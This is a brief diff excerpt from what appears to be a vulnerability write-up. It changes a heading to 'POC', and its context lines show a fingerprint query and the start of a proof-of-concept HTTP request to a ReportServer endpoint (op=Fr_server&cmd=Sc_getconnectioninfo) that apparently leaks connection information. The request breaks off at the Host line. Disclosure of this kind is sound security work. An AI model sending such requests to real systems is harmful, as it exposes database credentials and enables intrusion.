@@ -8,7 +8,7 @@ body="FM_SYS_ID" || body="product/recruit/website/RecruitIndex.jsp"
 
 ![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1729414884399-6be61b88-4e82-42e2-bfb0-451f6e130f92.png)
 
-## poc
+## POC
 ```java
 GET /ReportServer?op=Fr_server&cmd=Sc_getconnectioninfo HTTP/1.1
 Host: 
